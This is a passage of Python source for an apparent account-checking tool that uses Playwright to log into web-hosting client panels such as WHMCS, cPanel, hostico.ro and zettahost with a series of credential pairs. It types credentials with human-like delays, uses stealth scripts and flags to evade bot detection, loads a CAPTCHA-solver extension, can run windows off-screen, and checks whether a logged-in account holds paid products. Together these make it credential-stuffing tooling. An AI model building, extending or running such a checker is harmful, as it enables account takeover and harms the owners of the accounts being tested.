                            '.modal-backdrop.show', '.modal-backdrop.fade',
                            '#cookie-overlay', '.cookie-overlay',
                            '#gdpr-overlay',  '.gdpr-overlay',
                            '#consent-overlay', '.consent-overlay',
                            '#cookies-consent-container',
                            '#CybotCookiebotDialog',
                            '#onetrust-banner-sdk',
                            '.cookie-banner', '.cookie-notice',
                        ]) {
                            for (const el of document.querySelectorAll(sel))
                                el.remove();
                        }
                        // Re-enable body scroll locked by overlays
                        document.body.style.overflow = '';
                        document.body.classList.remove(
                            'modal-open', 'overflow-hidden', 'noscroll');
                    }
                """)
            except Exception:
                pass
            break   # nothing left to dismiss — exit the pass loop

        # Brief pause to let the dismiss animation settle before the next pass
        try:
            page.wait_for_timeout(400)
        except Exception:
            break


# Login-page URL path fragments used to detect "still on login page"
_LOGIN_URL_MARKERS = (
    "login", "signin", "sign-in", "sign_in",
    "logowanie", "zaloguj", "logon", "auth",
    "/security/login", "rp=/login",
)

# Selectors that indicate a login form is still visible on the page
_LOGIN_FORM_JS = """
() => {
    const passFields = document.querySelectorAll(
        "input[type='password']:not([style*='display:none']):not([style*='display: none'])"
    );
    for (const f of passFields) {
        const r = f.getBoundingClientRect();
        if (r.width > 0 && r.height > 0) return true;
    }
    return false;
}
"""

# JavaScript that returns True when a visible error-alert element is present.
# Detects Bootstrap .alert-danger, .alert-error, and common error-indicator
# classes used by panels like WHMCS, cPanel, and Plesk.
_ERROR_ALERT_JS = """
() => {
    const selectors = [
        '.alert-danger', '.alert-error',
        '.errorbox', '.login-error', '.invalid-feedback',
        '.error-message', '.notification-error', '.form-error',
        '.whmcs-error', '.clientarea-error',
    ];
    for (const sel of selectors) {
        const els = document.querySelectorAll(sel);
        for (const el of els) {
            // Must be rendered (not display:none / visibility:hidden)
            if (el.offsetParent !== null && (el.innerText || '').trim().length > 3) {
                return true;
            }
        }
    }
    return false;
}
"""


def _url_has_login_marker(url: str) -> bool:
    """Return True if the URL path/query looks like a login page."""
    u = url.lower().split("?")[0]   # strip query string
    return any(m in u for m in _LOGIN_URL_MARKERS)


# Ordered list of selectors used to find a login trigger button/link on pages
# where the login form is hidden behind a modal (e.g. akky.mx).
_LOGIN_TRIGGER_SELECTORS = [
    # Explicit login/sign-in buttons/links (English)
    "a:has-text('Login')",
    "a:has-text('Log in')",
    "a:has-text('Log In')",
    "a:has-text('Sign in')",
    "a:has-text('Sign In')",
    "button:has-text('Login')",
    "button:has-text('Log in')",
    "button:has-text('Log In')",
    "button:has-text('Sign in')",
    "button:has-text('Sign In')",
    # id / class -based common login triggers
    "#login-button",
    "#loginButton",
    "#btn-login",
    "#btnLogin",
    ".login-button",
    ".login-btn",
    ".btn-login",
    ".btnLogin",
    "[data-action='login']",
    "[data-target*='login' i]",
    "[data-bs-target*='login' i]",
    # href-pattern anchors
    "a[href*='#login']",
    "a[href*='login']",
    # Spanish / Latin-American portals (e.g. akky.mx)
    "a:has-text('Iniciar sesión')",
    "a:not([data-social]):has-text('Ingresar')",
    "a:not([data-social]):has-text('Entrar')",
    "button:has-text('Iniciar sesión')",
    "button:not([data-social]):has-text('Ingresar')",
    "button:not([data-social]):has-text('Entrar')",
    # Polish
    "a:has-text('Zaloguj')",
    "a:has-text('Zaloguj się')",
    "button:has-text('Zaloguj')",
    # Bulgarian
    "a:has-text('Вход')",
    "button:has-text('Вход')",
    # German
    "a:has-text('Anmelden')",
    "button:has-text('Anmelden')",
    # French
    "a:has-text('Connexion')",
    "button:has-text('Connexion')",
    # Nav-bar user/account icon links that open a login dropdown
    "a[class*='user' i][href*='login' i]",
    "a[class*='account' i][href*='login' i]",
    "[class*='nav' i] a[href*='login' i]",
    "[class*='header' i] a[href*='login' i]",
]

_HOSTICO_LOGIN_TRIGGER_SELECTORS = [
    "a:has-text('Log In')",
    "button:has-text('Log In')",
    "a:has-text('Login')",
    "button:has-text('Login')",
    "a:has-text('Autentifică')",
    "button:has-text('Autentifică')",
]

# Selectors used to switch auth widgets from Sign Up/Register to Login.
_LOGIN_TAB_SELECTORS = [
    "[role='tab']:has-text('Log In')",
    "[role='tab']:has-text('Login')",
    "[class*='tab' i]:has-text('Log In')",
    "[class*='tab' i]:has-text('Login')",
    "a:has-text('Log In')",
    "button:has-text('Log In')",
    "a:has-text('Login')",
    "button:has-text('Login')",
    "a:has-text('Sign In')",
    "button:has-text('Sign In')",
    "a:has-text('Autentifică')",
    "button:has-text('Autentifică')",
]

_HOSTICO_LOGIN_TAB_SELECTORS = [
    ".modal.show [role='tab']:has-text('Log In')",
    ".modal.show [class*='tab' i]:has-text('Log In')",
    ".modal.show a:has-text('Log In')",
    ".modal.show button:has-text('Log In')",
    "[class*='modal' i] [role='tab']:has-text('Log In')",
    "[class*='modal' i] [class*='tab' i]:has-text('Log In')",
    "[class*='modal' i] a:has-text('Log In')",
    "[class*='modal' i] button:has-text('Log In')",
    ".modal.show a:has-text('Autentifică')",
    ".modal.show button:has-text('Autentifică')",
]


_SOCIAL_AUTH_MARKERS = (
    "facebook", "google", "linkedin", "apple",
    "microsoft", "twitter", "github", "discord",
    "oauth", "social",
)


def _looks_like_social_auth_element(locator) -> bool:
    """Return True when *locator* appears to be a social/OAuth login button."""
    try:
        txt = (locator.inner_text(timeout=500) or "").strip().lower()
    except Exception:
        txt = ""
    try:
        href = (locator.get_attribute("href") or "").strip().lower()
    except Exception:
        href = ""
    try:
        cls = (locator.get_attribute("class") or "").strip().lower()
    except Exception:
        cls = ""
    try:
        data_social = (locator.get_attribute("data-social") or "").strip().lower()
    except Exception:
        data_social = ""

    haystack = " ".join([txt, href, cls, data_social])
    return bool(data_social) or any(m in haystack for m in _SOCIAL_AUTH_MARKERS)


def _click_first_non_social(page, selector: str, timeout_ms: int = 3_000) -> bool:
    """
    Click the first visible, non-social element matching *selector*.
    Returns True when a click was performed, otherwise False.
    """
    try:
        loc = page.locator(selector)
        count = loc.count()
    except Exception:
        return False

    if count <= 0:
        return False

    for i in range(count):
        try:
            cand = loc.nth(i)
            if not cand.is_visible(timeout=timeout_ms):
                continue
            if _looks_like_social_auth_element(cand):
                print(f"[CLICK] Skip social candidate for {selector!r} (idx={i})")
                continue
            cand.click(timeout=timeout_ms)
            print(f"[CLICK] Clicked safe candidate for {selector!r} (idx={i})")
            return True
        except Exception:
            continue
    return False


def _try_switch_to_login_tab(
    page,
    timeout_ms: int = 3_000,
    custom_login_tab_sel: "str | None" = None,
) -> bool:
    """
    Best-effort switch from Sign Up/Register tab to Login tab.
    Returns True when a likely login tab/button click was performed.
    """
    selectors: list[str] = []
    if custom_login_tab_sel:
        selectors.append(custom_login_tab_sel)

    url_now = ""
    try:
        url_now = (page.url or "").lower()
    except Exception:
        pass

    if "hostico.ro" in url_now:
        selectors.extend(_HOSTICO_LOGIN_TAB_SELECTORS)
    selectors.extend(_LOGIN_TAB_SELECTORS)

    seen: set[str] = set()
    dedup = [s for s in selectors if not (s in seen or seen.add(s))]

    for sel in dedup:
        try:
            if _click_first_non_social(page, sel, timeout_ms=timeout_ms):
                print(f"[LOGIN-TAB] Switched to login tab via {sel!r}")
                try:
                    page.wait_for_timeout(300)
                except Exception:
                    pass
                return True
        except Exception:
            continue
    return False


def _try_open_login_modal(
    page,
    timeout_ms: int = 8_000,
    custom_user_sel: "str | None" = None,
    custom_pass_sel: "str | None" = None,
    custom_trigger_sel: "str | None" = None,
    custom_login_tab_sel: "str | None" = None,
) -> bool:
    """
    If no login form (password field) is currently visible on the page,
    search for a login trigger button/link, click it, and wait for a
    password field to appear (modal / dropdown / on-page form reveal).

    Returns True if a login form became visible, False otherwise.
    All exceptions are silently swallowed — the caller falls back gracefully.
    """
    from playwright.sync_api import TimeoutError as PWTimeout
    print("[INFO] Checking for hidden login form behind a modal or dropdown...")
    _force_login_tab = bool(custom_login_tab_sel)
    try:
        _force_login_tab = _force_login_tab or ("hostico.ro" in (page.url or "").lower())
    except Exception:
        pass

    if _force_login_tab:
        # Some portals open Sign Up by default even when auth controls are visible.
        _try_switch_to_login_tab(
            page,
            timeout_ms=min(timeout_ms, 3_500),
            custom_login_tab_sel=custom_login_tab_sel,
        )

    # If custom selectors are configured and visible, the native form is
    # already present — never click a login trigger.
    if custom_user_sel and custom_pass_sel:
        try:
            if (
                page.is_visible(custom_user_sel, timeout=2_000)
                and page.is_visible(custom_pass_sel, timeout=2_000)
            ):
                print("[INFO] Native login form already visible via custom selectors")
                return True
        except Exception:
            pass

    # If a password field is already visible, nothing to do.
    try:
        # Give login forms that are already present enough time to settle
        # before attempting any "open login" trigger click.
        if page.is_visible("input[type='password']", timeout=min(timeout_ms, 5_000)):
            return True
    except Exception:
        pass

    # If a native user+password pair is already visible, avoid trigger clicks.
    try:
        has_user = bool(_find_visible_selector(
            page,
            [
                "input[name='username']",
                "input[name='userName']",
                "input[name='email']",
                "input[type='email']",
                "input[type='text']",
            ],
            timeout_ms=3_000,
        ))
        has_pass = bool(_find_visible_selector(
            page,
            [
                "input[name='password']",
                "input[type='password']",
                "input[class*='pass' i]",
            ],
            timeout_ms=3_000,
        ))
        if has_user and has_pass:
            print("[INFO] Native username/password fields are already visible")
            return True
    except Exception:
        pass

    trigger_selectors: list[str] = []
    if custom_trigger_sel:
        trigger_selectors.append(custom_trigger_sel)
    try:
        if "hostico.ro" in (page.url or "").lower():
            trigger_selectors.extend(_HOSTICO_LOGIN_TRIGGER_SELECTORS)
    except Exception:
        pass
    trigger_selectors.extend(_LOGIN_TRIGGER_SELECTORS)
    seen_trigger: set[str] = set()
    trigger_selectors = [s for s in trigger_selectors if not (s in seen_trigger or seen_trigger.add(s))]

    # Try each trigger selector in priority order.
    for sel in trigger_selectors:
        try:
            loc = page.locator(sel)
            if loc.count() == 0:
                continue
            clicked = False
            for i in range(loc.count()):
                cand = loc.nth(i)
                if not cand.is_visible(timeout=800):
                    continue
                if _looks_like_social_auth_element(cand):
                    # Never click social/OAuth buttons when we are trying to reveal
                    # the regular username/password form.
                    print(f"[LOGIN-MODAL] Skipping social trigger: {sel} (idx={i})")
                    continue
                print(f"[LOGIN-MODAL] Clicking trigger: {sel} (idx={i})")
                cand.click(timeout=3_000)
                clicked = True
                break
            if not clicked:
                continue
            # Wait for a password input to become reachable / visible.
            try:
                page.wait_for_selector(
                    "input[type='password']",
                    state="visible",
                    timeout=timeout_ms,
                )
                if _force_login_tab:
                    _try_switch_to_login_tab(
                        page,
                        timeout_ms=min(timeout_ms, 3_500),
                        custom_login_tab_sel=custom_login_tab_sel,
                    )
                return True
            except PWTimeout:
                # Password field didn't appear — maybe the click navigated;
                # check again before trying next selector.
                try:
                    if page.is_visible("input[type='password']", timeout=800):
                        if _force_login_tab:
                            _try_switch_to_login_tab(
                                page,
                                timeout_ms=min(timeout_ms, 3_500),
                                custom_login_tab_sel=custom_login_tab_sel,
                            )
                        return True
                except Exception:
                    pass
        except Exception:
            continue

    return False


def _prepare_hostico_login_panel(
    page,
    timeout_ms: int = 8_000,
) -> "tuple[str | None, str | None, str | None]":
    """
    Hostico-specific prep step:
    - if we are on hostico.ro/client auth panel, force the "Log In" tab
    - return selectors bound to the `clientlogin` form

    This avoids filling the Sign Up form when it is the default visible tab.
    """
    try:
        url_now = (page.url or "").lower()
    except Exception:
        return (None, None, None)

    if "hostico.ro" not in url_now:
        return (None, None, None)

    login_user_sel = "input[form='clientlogin'][name='email']"
    login_pass_sel = "input[form='clientlogin'][name='password']"
    login_submit_sel = "button[form='clientlogin'][type='submit']"
    login_tab_selectors = [
        "main#loginPage button:has-text('Log In')",
        "main#loginPage .s31:has-text('Log In')",
        "main#loginPage button:has-text('Autentifică')",
    ]

    try:
        if page.is_visible(login_user_sel, timeout=1_000) and page.is_visible(login_pass_sel, timeout=1_000):
            return (login_user_sel, login_pass_sel, login_submit_sel)
    except Exception:
        pass

    switched = False
    for sel in login_tab_selectors:
        if _click_first_non_social(page, sel, timeout_ms=min(timeout_ms, 3_000)):
            print(f"[HOSTICO] Switched to Log In tab via {sel!r}")
            switched = True
            break

    if switched:
        try:
            page.wait_for_selector(login_pass_sel, state="visible", timeout=timeout_ms)
        except Exception:
            pass

    try:
        if page.is_visible(login_user_sel, timeout=1_500) and page.is_visible(login_pass_sel, timeout=1_500):
            return (login_user_sel, login_pass_sel, login_submit_sel)
    except Exception:
        pass

    return (None, None, None)


def _is_whmcs_recaptcha_login_page(page) -> bool:
    """Detect WHMCS-style login form that uses a reCAPTCHA-gated submit."""
    try:
        return bool(page.evaluate(
            """() => {
                return !!(
                    document.querySelector("form.login-form[action*='/index.php/login']") ||
                    document.querySelector("input#inputEmail[name='username']") ||
                    document.querySelector("input#inputPassword[name='password']")
                );
            }"""
        ))
    except Exception:
        return False


def _wait_for_recaptcha_token(
    page,
    timeout_sec: int = 60,
    poll_ms: int = 600,
) -> bool:
    """
    Wait until reCAPTCHA token is populated in g-recaptcha-response.
    Needed for pages where solving the widget does not auto-submit.
    """
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        try:
            ready = bool(page.evaluate(
                """() => {
                    const el = document.querySelector('[name="g-recaptcha-response"]');
                    if (!el) return false;
                    const v = (el.value || '').trim();
                    return v.length > 20;
                }"""
            ))
            if ready:
                return True
        except Exception:
            pass
        try:
            page.wait_for_timeout(poll_ms)
        except Exception:
            return False
    return False


def _evaluate_result(html: str, final_url: str, login_url: str, page=None) -> str:
    """
    Determine login result using a strictly-ordered strategy.

    Priority (highest → lowest):
    1. **URL unchanged** from login URL — FAILED
       (with optional password-field confirmation when URL is same)
    2. **URL changed** + **login marker NOT in new URL** — SUCCESS
       (password-field check is deliberately skipped here: some dashboards
       embed auxiliary login widgets that would cause false negatives)
    3. **URL changed** + **login marker still in new URL** — FAILED (redirect to
       a different login variant, e.g. /login?error=1)
       (password-field check used here as extra signal)
    4. **Password field still visible** — FAILED (only when login_url unknown)
    5. **Keyword scan** — only used when URL info is unavailable or ambiguous
    6. **Fallback** — UNKNOWN

    NOTE: When the URL changed cleanly to a non-login URL the result is
    SUCCESS regardless of any password-field that may be present (e.g. a
    "quick-login" widget in a dashboard sidebar).  URL change is a more
    reliable signal than DOM presence of a password input.
    """
    lower = html.lower()
    fu    = final_url.lower().rstrip("/")
    lu    = login_url.lower().rstrip("/") if login_url else ""

    # ── 0. Visible error-alert DOM element (highest priority) ──────────────
    # Check for Bootstrap .alert-danger / .alert-error / panel error elements
    # BEFORE any URL-based analysis.  Some sites (e.g. WHMCS clientarea.php)
    # redirect to a URL with no login marker even on failure, which would
    # otherwise be mis-classified as SUCCESS by the URL heuristic.
    if page is not None:
        try:
            if page.evaluate(_ERROR_ALERT_JS):
                return "FAILED"
        except Exception:
            pass

    # ── 1, 2, 3. URL-based analysis (highest priority) ───────────────────
    if lu:
        if fu == lu:
            # URL did not change at all — login failed / no redirect occurred
            return "FAILED"

        # URL changed — inspect whether the new URL still looks like a login page
        if not _url_has_login_marker(final_url):
            # Clean redirect to a non-login URL (dashboard, panel, etc.) → SUCCESS
            # NOTE: we intentionally do NOT check for a visible password field
            # here because dashboard pages can legitimately embed login widgets.
            return "SUCCESS"
        else:
            # Redirected to a login-looking URL (e.g. /login?error=1) → FAILED
            # Password-field check provides extra confirmation but result is
            # FAILED either way.
            if page is not None:
                try:
                    page.evaluate(_LOGIN_FORM_JS)
                except Exception:
                    pass
            return "FAILED"

    # ── 4. Password field still visible (login_url unknown/empty) ────────
    # Only reached when we have no reference login URL to compare against.
    # A visible password field is a strong FAILED signal in that case.
    if page is not None:
        try:
            pass_field_visible = page.evaluate(_LOGIN_FORM_JS)
        except Exception:
            pass_field_visible = None
        if pass_field_visible is True:
            return "FAILED"

    # ── 5. Keyword scan (only when login_url is unknown/empty) ───────────
    # Failure keywords first — error messages are precise; success words are
    # common in page chrome (nav links, meta tags, scripts).
    for kw in FAILURE_KEYWORDS:
        if kw in lower:
            return "FAILED"

    for kw in SUCCESS_KEYWORDS:
        if kw in lower:
            return "SUCCESS"

    # ── 6. URL path analysis without a reference login_url ───────────────
    if not _url_has_login_marker(final_url):
        return "UNKNOWN (redirected — no login marker in URL)"

    return "UNKNOWN"


# ---------------------------------------------------------------------------
# Enhanced Result Evaluation — with Toast/Notification Detection
# ---------------------------------------------------------------------------

def _evaluate_result_advanced(
    html: str,
    final_url: str,
    login_url: str,
    page=None,
    verbose: bool = False,
) -> str:
    """
    Enhanced login result determination using advanced page analysis with caching.
    
    This function combines multiple approaches:
    1. **Form Cache** — Checks for cached result patterns by domain
    2. **Page Analyzer** — Detects toast notifications, error messages, success
       indicators, 2FA/CAPTCHA, and page structure
    3. **Fallback** — Uses traditional URL + keyword analysis if needed
    
    Detects:
    - Toast/notification messages (success/error indicators)
    - Error message elements (.alert-danger, [role='alert'], etc.)
    - Success message elements (.alert-success, etc.)
    - 2FA indicators (verification codes, authenticator prompts)
    - CAPTCHA indicators
    - Page structure (login forms still visible, password fields visible)
    - Multi-language support (English, Bulgarian, Polish)
    
    Parameters
    ----------
    html : str
        HTML content after login attempt
    final_url : str
        URL after login attempt
    login_url : str
        Original login URL for comparison
    page : Playwright Page object, optional
        Page object for live element detection (more accurate)
    verbose : bool
        Print detailed analysis report
    
    Returns
    -------
    str
        One of: SUCCESS, FAILED, 2FA_REQUIRED, CAPTCHA, UNKNOWN
    
    Examples
    --------
    >>> # Basic usage (URL + HTML only)
    >>> result = _evaluate_result_advanced(html, final_url, login_url)
    
    >>> # With page object (live element detection - recommended)
    >>> result = _evaluate_result_advanced(html, final_url, login_url, page=page, verbose=True)
    
    >>> # If page_analyzer unavailable, automatically falls back to basic evaluation
    """
    # Try to get cached result pattern first
    if form_cache is not None:
        domain = FormCache.extract_domain(login_url)
        cached_result = form_cache.get_result_pattern(domain, html)
        if cached_result:
            result, confidence = cached_result
            if verbose:
                print(f"[evaluate_result_advanced] Using cached pattern: {result} ({confidence}% confidence)")
            return result
    
    # If page_analyzer module not available, fall back to basic evaluation
    if analyze_page_for_result is None or page is None:
        if verbose:
            print("[evaluate_result_advanced] page_analyzer unavailable or page=None, using fallback")
        return _evaluate_result(html, final_url, login_url, page=page)
    
    # Use the advanced page analyzer
    try:
        result, confidence, details = analyze_page_for_result(
            page,
            html,
            login_url=login_url,
            verbose=verbose,
        )
        
        if verbose:
            print(generate_analysis_report(result, confidence, details))
        
        # Cache the result for future use
        if form_cache is not None:
            domain = FormCache.extract_domain(login_url)
            
            # Determine what indicator was used for this result
            selector = None
            text_pattern = None
            
            if result == "SUCCESS" and details.get('success_indicators', {}).get('visible'):
                # Get the first success indicator selector
                visible_success = details['success_indicators'].get('visible', [])
                if visible_success:
                    selector, text_pattern = visible_success[0]
            elif result == "FAILED" and details.get('errors', {}).get('visible'):
                # Get the first error indicator selector
                visible_errors = details['errors'].get('visible', [])
                if visible_errors:
                    selector, text_pattern = visible_errors[0]
            
            form_cache.add_result_pattern(
                domain,
                result,
                selector=selector,
                text_pattern=text_pattern,
                confidence=confidence,
            )
            form_cache.save()
        
        # Map page_analyzer results to checker.py result codes
        # (they should already match: SUCCESS, FAILED, 2FA_REQUIRED, CAPTCHA, UNKNOWN)
        return result
        
    except Exception as e:
        if verbose:
            print(f"[evaluate_result_advanced] Error during advanced analysis: {e}")
            print(f"  Falling back to basic evaluation")
        # Fall back to traditional method on any error
        return _evaluate_result(html, final_url, login_url, page=page)



# ---------------------------------------------------------------------------
# Session management
# ---------------------------------------------------------------------------

def save_session(context) -> None:
    """Persist browser cookies/localStorage to state.json."""
    context.storage_state(path=str(SESSION_FILE))



# ---------------------------------------------------------------------------
# Post-login cleanup — logout + wipe saved browser state
# ---------------------------------------------------------------------------

_LOGOUT_SELECTORS = [
    # English
    "a[href*='logout']",
    "a[href*='signout']",
    "a[href*='sign-out']",
    "a[href*='log-out']",
    "button:has-text('Logout')",
    "button:has-text('Log out')",
    "button:has-text('Sign out')",
    "a:has-text('Logout')",
    "a:has-text('Log out')",
    "a:has-text('Sign out')",
    # Bulgarian
    "a[href*='logout']",
    "a:has-text('Изход')",
    "button:has-text('Изход')",
    "a:has-text('изход')",
    # WHMCS / cPanel / generic panel logout
    "a[href*='action=logout']",
    "a[href*='do=logout']",
    "a[href*='cmd=logout']",
    "a[href*='step=logout']",
    "a[href*='/logout']",
    "a[href*='logout.php']",
    "a[href*='signout.php']",
]


def _logout_and_clear(page, context, timeout_ms: int = 10_000) -> None:
    """
    Best-effort logout after a successful login check:
      1. Try to click any visible logout link / button on the current page.
      2. If no logout element found, clear cookies + storage via the context API.
      3. Always delete state.json so no session is persisted to disk.

    This ensures a clean slate for the next credential pair.
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    clicked_logout = False

    # ── 1. Try clicking a logout button / link ────────────────────────────
    for sel in _LOGOUT_SELECTORS:
        try:
            if page.is_visible(sel, timeout=1_500):
                try:
                    page.click(sel, timeout=timeout_ms)
                except Exception:
                    pass
                clicked_logout = True
                # Give the logout navigation a moment to settle
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=timeout_ms)
                except Exception:
                    pass
                break
        except Exception:
            continue

    # ── 2. Clear browser storage via Playwright context API ───────────────
    # This removes all cookies, localStorage and sessionStorage even if the
    # logout click didn't fully work or wasn't found.
    try:
        context.clear_cookies()
    except Exception:
        pass
    try:
        page.evaluate("() => { try { localStorage.clear(); sessionStorage.clear(); } catch(e) {} }")
    except Exception:
        pass

    # ── 3. Delete persisted state.json so it isn't reused ────────────────
    clear_session()


def load_session_exists() -> bool:
    return SESSION_FILE.exists()


def clear_session() -> None:
    if SESSION_FILE.exists():
        SESSION_FILE.unlink()


# ---------------------------------------------------------------------------
# Core Playwright checker
# ---------------------------------------------------------------------------

# Default browser executable path — can be overridden at runtime via
# set_browser_executable() so the user can pick any Chrome/Edge/Brave build.
_browser_executable: str = r"C:\Program Files\Google\Chrome\Application\chrome.exe"


def get_browser_executable() -> str:
    """Return the currently configured browser executable path."""
    return _browser_executable


def set_browser_executable(path: str) -> None:
    """
    Set the browser executable Playwright will use for all visible-browser
    sessions (interactive checking, CAPTCHA solving, recording).
    Pass an empty string to fall back to Playwright's bundled Chromium.
    """
    global _browser_executable
    _browser_executable = path.strip()


# Whether to load the CAPTCHA solver extension (e.g. captchasonic) when
# launching visible-browser sessions.  Toggled via the GUI checkbox.
_use_captcha_extension: bool = True
_captcha_extension_path: str = EXTENSION_PATH


def get_use_captcha_extension() -> bool:
    return _use_captcha_extension


def set_use_captcha_extension(enabled: bool) -> None:
    global _use_captcha_extension
    _use_captcha_extension = enabled


def get_captcha_extension_path() -> str:
    """Return the configured CAPTCHA extension directory path."""
    return _captcha_extension_path


def set_captcha_extension_path(path: str) -> None:
    """Set CAPTCHA extension directory used by launch_persistent_context()."""
    global _captcha_extension_path
    _captcha_extension_path = path.strip()


# Whether to launch browser windows off-screen (minimized/hidden).
# Toggled via the GUI checkbox.
_minimized_mode: bool = False


def get_minimized_mode() -> bool:
    return _minimized_mode


def set_minimized_mode(enabled: bool) -> None:
    global _minimized_mode
    _minimized_mode = enabled

def get_random_window_position(screen_width=1920, screen_height=1080,
                               window_width=1200, window_height=800):
    
    max_x = screen_width - window_width
    max_y = screen_height - window_height

    if max_x < 0 or max_y < 0:
        raise ValueError("Window size is larger than screen size")

    x = random.randint(0, max_x)
    y = random.randint(0, max_y)
    return x, y


def _get_system_chrome_path() -> str:
    """
    Detect system's installed Chrome browser executable path.
    
    Returns the path to Chrome, or bundled Chromium if not found.
    """
    system = platform.system()
    
    # Windows
    if system == "Windows":
        possible_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
            os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"),
            # Also check for Edge
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
            os.path.expandvars(r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"),
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                print(f"[OK] Found Chrome: {path}")
                return path
    
    # macOS
    elif system == "Darwin":
        possible_paths = [
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Chromium.app/Contents/MacOS/Chromium",
        ]
        for path in possible_paths:
            if os.path.exists(path):
                print(f"[OK] Found Chrome: {path}")
                return path
    
    # Linux
    elif system == "Linux":
        possible_commands = ["google-chrome", "chromium", "chromium-browser"]
        for cmd in possible_commands:
            path = shutil.which(cmd)
            if path:
                print(f"[OK] Found Chrome: {path}")
                return path
    
    print("[WARN] System Chrome not found, using bundled Chromium")
    return ""  # Fall back to bundled Chromium


def _resolve_browser_executable() -> str:
    """Return a valid browser executable path or empty string for bundled Chromium."""
    configured = (get_browser_executable() or "").strip().strip('"').strip("'")
    if configured:
        if os.path.isfile(configured):
            return configured
        print(f"[WARN] Configured browser path not found: {configured}")

    system = (_get_system_chrome_path() or "").strip().strip('"').strip("'")
    if system and os.path.isfile(system):
        return system
    return ""


def _make_context(playwright, headless: bool = False, proxy: dict | None = None):
    """
    Create a browser context for login checking.

    When the CAPTCHA solver extension is enabled, uses
    ``launch_persistent_context()`` — the only Playwright API that actually
    loads Chrome extensions.  In that case the returned *browser* is ``None``
    because ``launch_persistent_context`` gives back a BrowserContext directly.

    When the extension is disabled, uses the normal ``launch()`` +
    ``new_context()`` path with the user-configured system browser.

    Returns
    -------
    (browser, context)
        browser may be None when using launch_persistent_context.
        Callers must guard: ``if browser: browser.close()``
    """
    # Use a neutral locale + UA that doesn't hint at automation.
    # The STEALTH_JS script further patches navigator.languages at runtime.
    _context_opts = {
        "headless": headless,
        "locale": "en-US",
        "timezone_id": "Europe/Istanbul",
        "viewport": {"width": 1280, "height": 800},
        "user_agent": _REAL_UA,
    }
    if proxy:
        _context_opts["proxy"] = proxy

    # ── Extension path: use launch_persistent_context so the extension loads ──
    if _use_captcha_extension:
        extension_path = Path(get_captcha_extension_path()).resolve()
        if extension_path.exists() and (extension_path / "manifest.json").exists():
            # IMPORTANT: Always use Playwright's bundled Chromium for extension
            # loading.  Google Chrome (and other system browsers) enforce stricter
            # extension security policies that block --load-extension in automated
            # contexts, so setting executable_path to system Chrome breaks the
            # extension.  Bundled Chromium is the only reliable target for this.
            print(f"[OK] Using Playwright bundled Chromium + CAPTCHA extension: {extension_path}")
            # Each call gets a unique temp profile so parallel / sequential
            # calls never collide on the Chrome profile lock.
            user_data_dir = tempfile.mkdtemp(prefix="pw_captcha_")
            _context_opts["args"] = [
                "--no-sandbox",
                "--disable-infobars",
                *(["--window-position=-32000,-32000"] if _minimized_mode else []),
                # These two flags are what actually load the extension:
                "--disable-extensions-except=" + str(extension_path),
                "--load-extension=" + str(extension_path),
            ]
            # Extension loading requires headed mode — force it regardless of
            # the headless parameter passed by the caller.
            _context_opts["headless"] = False
            # Do NOT set executable_path — always use bundled Chromium here.
            try:
                context = playwright.chromium.launch_persistent_context(
                    user_data_dir, **_context_opts
                )
            except Exception as e:
                print(f"[WARN] launch_persistent_context failed: {e}")
                shutil.rmtree(user_data_dir, ignore_errors=True)
                context = None
                if context is None:
                    print("[WARN] Falling back to normal browser launch (no extension)")
            else:
                _apply_stealth(context)
                # Tag the context so callers can clean up the temp profile
                context._pw_tmp_user_data_dir = user_data_dir
                # launch_persistent_context returns context directly — no browser obj
                return None, context
        else:
            print("[WARN] CAPTCHA extension enabled but not found at:", get_captcha_extension_path())

    # ── Normal path: launch + new_context ─────────────────────────────────
    print("[INFO] Launching browser (no extension)")
    chrome_path = _resolve_browser_executable()
    launch_args: dict = {
        "headless": headless,
        "args": [
            "--no-sandbox",
            "--disable-infobars",
            "--disable-extensions",
            *(["--window-position=-32000,-32000"] if _minimized_mode else []),
            # Suppress automation infobar and CDP features that CF can fingerprint
            "--disable-blink-features=AutomationControlled",
            "--disable-features=IsolateOrigins,site-per-process",
        ],
    }
    if proxy:
        launch_args["proxy"] = proxy
    if chrome_path:
        launch_args["executable_path"] = chrome_path

    try:
        browser = playwright.chromium.launch(**launch_args)
    except Exception as e:
        if chrome_path:
            print(f"[WARN] System browser failed ({e}), retrying with bundled Chromium")
            launch_args.pop("executable_path", None)
            try:
                browser = playwright.chromium.launch(**launch_args)
            except Exception as e2:
                raise RuntimeError(
                    f"Browser launch failed (both system and bundled): {e2}"
                ) from e2
        else:
            raise

    context = browser.new_context(
        locale="en-US",
        timezone_id="Europe/Istanbul",
        viewport={"width": 1280, "height": 800},
        user_agent=_REAL_UA,
    )
    _apply_stealth(context)
    return browser, context


def _cleanup_context(context) -> None:
    """Close context and remove its temp profile directory if one was created."""
    tmp_dir = getattr(context, "_pw_tmp_user_data_dir", None)
    try:
        context.close()
    except Exception:
        pass
    if tmp_dir:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def _type_human(page, selector: str, text: str):
    """Type text character-by-character with random delays (human-like)."""
    page.click(selector)
    _random_delay(0.3, 0.8)
    # Clear existing value first
    page.fill(selector, "")
    for char in text:
        page.type(selector, char, delay=random.randint(60, 180))


# ---------------------------------------------------------------------------
# Domain-specific login handlers
# ---------------------------------------------------------------------------

def _try_login_zettahost(
    page, context, username: str, password: str, timeout: int
) -> str:
    """
    Dedicated login handler for cp1.zettahost.bg.

    Flow:
      1. Navigate to login page (handles any zettahost URL variant)
      2. Wait for form fields, fill credentials, submit
      3. Confirm login succeeded — redirected away from /login
      4. Navigate to /services/renew?mcid=top-menu
      5. If page contains "You don't have any products." → FAILED — No products
         Otherwise (products listed)                    → SUCCESS
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    LOGIN_URL        = "https://cp1.zettahost.bg/login"
    RENEW_URL        = "https://cp1.zettahost.bg/services/renew?mcid=top-menu"
    NO_PRODUCTS_TEXT = "you don't have any products."

    try:
